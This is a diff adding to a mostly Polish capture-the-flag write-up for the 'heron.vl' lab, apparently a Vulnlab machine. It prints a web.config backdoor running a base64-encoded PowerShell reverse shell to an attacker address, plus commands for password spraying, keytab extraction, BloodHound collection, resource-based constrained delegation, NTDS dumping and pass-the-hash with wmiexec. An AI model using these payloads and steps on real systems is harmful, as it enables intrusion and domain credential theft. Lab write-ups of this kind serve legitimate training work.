@@ -104,7 +104,107 @@ po prawie 2h udało mi się... je jebe.
 ```
 TO DZIAŁA. Czas przerobić to na rev shella
 
+- wróciłem po 5 dniach przerwy i payload wyżej nie działa.. nie wierzę po prostu
+- dobra bo ja muszę się odnieść do domenki, a nie samego adresu IP xD
 
+```
+  <?xml version="1.0" encoding="utf-8"?>  
+<configuration>  
+  <location path="." inheritInChildApplications="false">  
+    <system.webServer>  
+      <handlers>  
+        <add name="aspNetCore" path="backdoor" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />  
+      </handlers>  
+      <aspNetCore processPath="powershell" arguments="-e CgAkAHgAeAB4AHgAIAA9ACAAJwAxADAALgA4AC4ANAAuADEAMgA0ACcACgAkAHAAbwByAHQAIAA9ACAAJwA0ADQAMwAnAAoAJAB0AGMAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACQAeAB4AHgAeAAsACQAcABvAHIAdAApAAoAJAB0AGMAcABzAHQAcgAgAD0AIAAkAHQAYwBwAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAdABjAHAAcwB0AHIAKQAKACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHQAYwBwAHMAdAByACkACgAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlAAoAdwBoAGkAbABlACAAKAAkAHQAYwBwAC4AQwBvAG4AbgBlAGMAdABlAGQAKQAKAHsACgAkAHgAPQBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBhAGQAZQByAC4AUgBlAGEAZABMAGkAbgBlACgAKQA7AAoAJAB5AD0ATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJAB4AAoAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJAB5ACkAOwAKAH0ACgAkAHIAZQBhAGQAZQByAC4AQwBsAG8AcwBlACgAKQAKACQAdwByAGkAdABlAHIALgBDAGwAbwBzAGUAKAApAAoAJAB0AGMAcAAuAEMAbABvAHMAZQAoACkACgA=" hostingModel="OutOfProcess" />  
+    </system.webServer>  
+  </location>  
+</configuration>  
+<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
+```
+```
+proxychains4 -q curl accounting.heron.vl/backdoor/
+```
 
+![{76978B61-56A5-459C-8F49-01B760704422}](https://github.com/user-attachments/assets/560f7a84-c02d-4517-b8c4-4ddddef0bbe2)
 
+![{4701358D-27A1-4B07-89F7-2DD860005B79}](https://github.com/user-attachments/assets/a237fa71-d727-42d2-ab20-0e43084d3c2f)
 
+![ssh](https://github.com/user-attachments/assets/efa6a53c-769f-42fe-90f1-4f8f4e08c0bd)
+
+![{7B8C2F49-2AE6-4EE5-ABAE-95B554C077D3}](https://github.com/user-attachments/assets/ad0284db-dd81-470c-b3bc-2b8f57e4007d)
+
+szybki root
+
+![{70B879A3-9BB0-41FE-9071-706D806698A1}](https://github.com/user-attachments/assets/2810fb28-07f4-4222-b2b7-9f303d3c557e)
+
+jeszcze test czy to hasło nie działa gdzieś więcej
+```
+proxychains4 -q nxc smb 10.10.180.213 -u users -p '<password from ssh.ps1>' --continue-on-success
+```
+
+```
+SMB         10.10.180.213   445    MUCDC            [+] heron.vl\julian.pratt:'<password from ssh.ps1>
+
+```
+
+new user access.
+New it is time to dump something from `/etc/krb5.keytab`
+`https://raw.githubusercontent.com/sosdave/KeyTabExtract/refs/heads/master/keytabextract.py`
+
+![hash](https://github.com/user-attachments/assets/93a5f1df-2bf1-4ef8-a7f9-086c30da04d9)
+
+- chyba nic ciekawego na razie. Enumerujemy dalej.
+
+![lnk](https://github.com/user-attachments/assets/eb3deabd-2c53-4b1e-b911-2b881a9bf37b)
+
+kilka lnk się znalazło.
+
+![user](https://github.com/user-attachments/assets/6cf08c4b-3df6-4311-99d4-19d4082e0b9e)
+
+to już mamy.
+
+![new](https://github.com/user-attachments/assets/f2746a99-b53a-44b7-a8a1-063fde0d55da)
+
+a tutaj kolejny user
+
+```
+proxychains4 -q bloodhound-python -d 'heron.vl' -u 'adm_prju' -p '<password from .lnk>' -c all -ns 10.10.180.213
+```
+
+![{E1DCB96D-7699-464D-BBDA-71D40414C5CF}](https://github.com/user-attachments/assets/ac27072e-af1d-46ea-a157-ad9f9be447cc)
+
+![{A6EABD38-7A1F-42F4-A2EC-C61C1187BBF1}](https://github.com/user-attachments/assets/391b50c0-428c-4143-9847-8dd86d145c90)
+
+no to lecimy
+
+![0 pc](https://github.com/user-attachments/assets/fc253432-f0a3-4c4e-ac0b-dd95828a5e08)
+
+na początek utrudnienie, bo kompa dodać nie możemy.
+
+```
+proxychains4 -q impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -action 'write' 'heron.vl'/'adm_prju':'<password from .lnk>' -dc-ip 10.10.180.213
+proxychains4 -q impacket-getST -spn 'cifs/MUCDC' -impersonate '_admin' 'domain/FRAJMP$' -dc-ip 10.10.180.213 -hashes :6f55b3b443ef192c804b2ae98e8254f7
+```
+
+![hashprzydaje](https://github.com/user-attachments/assets/d76974c8-d2cd-494c-8c5b-c46e9e529420)
+
+tutaj nasz hash się przydaje
+
+![{B2516237-7B7B-4536-AC3D-00E8AECB38D7}](https://github.com/user-attachments/assets/87eb9db6-ad56-4052-91b1-dbf72d04f093)
+
+- coś nie śmiga :/
+
+I changed domain
+```
+proxychains4 -q impacket-getST -spn 'cifs/MUCDC.heron.vl' -impersonate '_admin' 'heron.vl/FRAJMP$' -dc-ip 10.10.180.213 -hashes :6f55b3b443ef192c804b2ae98e8254f7
+export KRB5CCNAME=_admin@cifs_MUCDC.heron.vl@HERON.VL.ccache
+proxychains4 -q nxc smb 10.10.180.213 --use-kcache --ntds
+```
+
+![final](https://github.com/user-attachments/assets/89132067-12c2-4145-9193-1708b2f5c3a1)
+
+```
+proxychains4 -q impacket-wmiexec _admin:''@10.10.180.213 -hashes :<hash> 
+```
+
+![flaga](https://github.com/user-attachments/assets/19a2beb6-f849-41dc-832e-d0420fe7c47e)
